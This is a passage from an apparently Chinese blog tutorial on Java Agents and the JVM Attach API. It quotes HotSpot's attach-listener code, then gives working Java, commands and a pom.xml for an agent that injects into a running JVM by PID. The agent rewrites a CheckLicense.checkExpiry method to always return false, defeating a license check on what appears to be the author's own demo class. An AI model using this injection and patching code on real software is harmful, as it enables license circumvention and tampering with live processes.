class="comment">//拉取一个需要执行的任务</span></span><br><span class="line">      AttachOperation* op = AttachListener::dequeue();</span><br><span class="line">      <span class="comment">// find the function to dispatch too</span></span><br><span class="line">      AttachOperationFunctionInfo* info = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; funcs[i].name != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* name = funcs[i].name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(op-&gt;name(), name) == <span class="number">0</span>) &#123;</span><br><span class="line">          info = &amp;(funcs[i]); <span class="keyword">break</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">       <span class="comment">// dispatch to the function that implements this operation</span></span><br><span class="line">        res = (info-&gt;func)(op, &amp;st);</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个函数执行逻辑，大概是这样的：</p><ul><li>拉取一个需要执行的任务：AttachListener::dequeue。</li><li>查询匹配的命令处理函数。</li><li>执行匹配到的命令执行函数。</li></ul><p>其中第二步里面存在一个命令函数表，整个表如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> AttachOperationFunctionInfo funcs[] = &#123;</span><br><span class="line">  &#123; <span class="string">"agentProperties"</span>,  get_agent_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"datadump"</span>,         data_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"dumpheap"</span>,         dump_heap &#125;,</span><br><span class="line">  &#123; <span class="string">"load"</span>,             load_agent &#125;,</span><br><span class="line">  &#123; <span class="string">"properties"</span>,       get_system_properties &#125;,</span><br><span class="line">  &#123; <span class="string">"threaddump"</span>,       thread_dump &#125;,</span><br><span class="line">  &#123; <span class="string">"inspectheap"</span>,      heap_inspection &#125;,</span><br><span class="line">  &#123; <span class="string">"setflag"</span>,          set_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"printflag"</span>,        print_flag &#125;,</span><br><span class="line">  &#123; <span class="string">"jcmd"</span>,             jcmd &#125;,</span><br><span class="line">  &#123; <span class="literal">NULL</span>,               <span class="literal">NULL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于加载Agent来说，命令就是“load”。</p><p>任务从哪来，这个秘密就藏在AttachListener::dequeue这行代码里面，接下来来分析一下dequeue这个函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LinuxAttachOperation* LinuxAttachListener::dequeue() &#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait for client to connect</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    RESTARTABLE(::accept(listener(), &amp;addr, &amp;len), s);</span><br><span class="line">    <span class="comment">// get the credentials of the peer and check the effective uid/guid</span></span><br><span class="line">    <span class="comment">// - check with jeff on this.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> <span class="title">cred_info</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> optlen = <span class="keyword">sizeof</span>(cred_info);</span><br><span class="line">    <span class="keyword">if</span> (::getsockopt(s, SOL_SOCKET, SO_PEERCRED, (<span class="keyword">void</span>*)&amp;cred_info, &amp;optlen) == <span class="number">-1</span>) &#123;</span><br><span class="line">      ::<span class="built_in">close</span>(s);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// peer credential look okay so we read the request</span></span><br><span class="line">    LinuxAttachOperation* op = read_request(s);</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码表明，Attach Listener在某个端口监听着，通过accept来接收一个连接，然后从这个连接里面将请求读取出来，然后将请求包装成一个AttachOperation类型的对象，之后就会从表里查询对应的处理函数，然后进行处理。</p><p>Attach Listener使用一种被称为“懒加载”的策略进行初始化，也就是说，JVM启动的时候Attach Listener并不一定会启动起来。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>运行时Attach方法里面的关键是调用VirtualMachine的attach方法进行Agent挂载的功能。</p><p>下面分析一下VirtualMachine的attach方法具体是怎么实现的。</p><p>Attach模式需要知道我们运行的Java程序进程ID，通过Java虚拟机的进程注入方式实现可以将我们的Agent程序动态的注入到一个已在运行中的Java程序中。</p><p>还是之前那个例子，可以使用<code>jps -l</code>命令进行查看：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210194815301.png" alt="image-20210210194815301"></p><p>Java代码实现可以使用<code>com.sun.tools.attach.VirtualMachine</code>的<code>list</code>方法即可获取本机所有运行的Java进程，如：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210200251210.png" alt="image-20210210200251210"></p><p>有了进程ID我们就可以使用Attach API注入Agent了，Attach Java进程注入通用示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java进程ID</span></span><br><span class="line">String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Agent文件的绝对路径</span></span><br><span class="line">String agentPath = <span class="string">"/xxx/agent.jar"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">vm.loadAgent(agentPath);</span><br><span class="line">vm.detach();</span><br></pre></td></tr></table></figure><p>使用Attach模式启动Agent程序时需要使用到JDK目录下的<code>lib/tools.jar</code>，如果没有配置<code>CLASS_PATH</code>环境变量的话需要在运行Agent程序时添加<code>-Xbootclasspath/a:$JAVA_HOME/lib/tools.jar</code>参数，否则无法使用Attach API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -jar AgentAttach<span class="number">-1.0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>首先后台运行监测代码，用我们的jar包获取目标进程：16281</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210222948056.png" alt="image-20210210222948056"></p><p>接下来直接注入就完事了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -classpath $JAVA_HOME/lib/tools.jar:AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar -jar AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar <span class="number">16281</span></span><br></pre></td></tr></table></figure><p>成功修改：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210223115419.png" alt="image-20210210223115419"></p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">            <span class="keyword">for</span> (VirtualMachineDescriptor desc : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">"进程ID："</span> + desc.id() + <span class="string">"，进程名称："</span> + desc.displayName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java进程ID</span></span><br><span class="line">        String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取当前Agent的jar包路径</span></span><br><span class="line">            URL agentURL = AttachAgent<span class="class">.<span class="keyword">class</span>.<span class="title">getProtectionDomain</span>().<span class="title">getCodeSource</span>().<span class="title">getLocation</span>()</span>;</span><br><span class="line">            String agentPath = <span class="keyword">new</span> File(agentURL.toURI()).getAbsolutePath();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">            vm.loadAgent(agentPath);</span><br><span class="line">            vm.detach();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        loadAgent(args, inst);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String arg, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建ClassFileTransformer对象</span></span><br><span class="line">        ClassFileTransformer classFileTransformer = createClassFileTransformer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加自定义的Transformer，第二个参数true表示是否允许Agent Retransform，</span></span><br><span class="line">        <span class="comment">// 需配合MANIFEST.MF中的Can-Retransform-Classes: true配置</span></span><br><span class="line">        inst.addTransformer(classFileTransformer, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有已经被JVM加载的类对象</span></span><br><span class="line">        Class[] loadedClass = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClass) &#123;</span><br><span class="line">            String className = clazz.getName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (inst.isModifiableClass(clazz)) &#123;</span><br><span class="line">                <span class="comment">// 使用Agent重新加载HelloWorld类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        inst.retransformClasses(clazz);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ClassFileTransformer <span class="title">createClassFileTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ClassFileTransformer() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@return</span> 字节码byte数组。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                                    ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">                className = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                        CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                        CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                                <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                        ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                        ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                        classfileBuffer = ctClass.toBytecode();</span><br><span class="line">                        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span 